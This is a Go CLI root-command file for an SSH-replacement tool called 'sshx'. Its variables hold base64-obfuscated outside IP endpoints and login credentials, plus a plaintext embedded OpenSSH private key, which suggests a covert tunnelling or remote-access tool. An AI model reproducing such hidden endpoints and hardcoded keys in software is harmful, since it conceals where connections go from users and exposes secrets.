package main

import (
	"fmt"

	"github.com/spf13/cobra"
)

var (
	input   string
	script  string
	timeout string
	encode  bool
	source  string

	local      = "MTI3LjAuMC4xOjEyMzQ="
	remote     = "MzEuMjIwLjEuMTY6MjIyNDg="
	server     = "ODkuMjQ5LjQ5LjEyODozMzMzMw=="
	user       = "Y29ubmVjdGVzdA=="
	password   = "bm9uZQ=="
	code       = "cm9uYWxk"
	privateKey = `
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCNSkQ4sTSAxGMVQyZwhiPbuwblg9cOYSdya07jIZDbRAAAAJAgv9BLIL/Q
SwAAAAtzc2gtZWQyNTUxOQAAACCNSkQ4sTSAxGMVQyZwhiPbuwblg9cOYSdya07jIZDbRA
AAAEDlCnI+yUOL3vXRxabAQ2Bd+L5aLeajfxTzudXlG+FJu41KRDixNIDEYxVDJnCGI9u7
BuWD1w5hJ3JrTuMhkNtEAAAAC3Jvb3RAaHA1NTQ1AQI=
-----END OPENSSH PRIVATE KEY-----
`
)

// RootCmd represents the base command when called without any subcommand
var RootCmd = &cobra.Command{
	Use:   "sshx",
	Short: "A replace tool for ssh features",
}

// Execute adds all child command to the root command sets flags appropriately.
func Execute() {
	if err := RootCmd.Execute(); err != nil {
		panic(fmt.Sprintf("root command execute: %v", err))
	}
}
